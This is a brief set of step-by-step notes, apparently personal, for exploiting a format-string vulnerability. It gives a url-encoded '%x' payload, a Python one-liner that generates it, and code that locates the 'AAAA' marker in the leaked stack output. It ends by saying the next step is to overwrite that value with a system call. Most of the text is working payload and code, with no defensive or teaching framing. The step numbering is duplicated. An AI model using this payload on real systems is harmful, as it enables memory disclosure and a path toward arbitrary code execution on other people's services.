1. Locate vulnerable input
2. Send data: %x and look for memory leak. Send as %25x (urlencoded) for HTTP requests
2. Generate string
print(".%25x"*128)
3. Send
AAAAA%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x.%25x......
4. Decode output and look for location sof A's
x = attack_string
x = x.split('.')
x.index('41414141')

# Next we will look to replace value of '41414141' to a system call
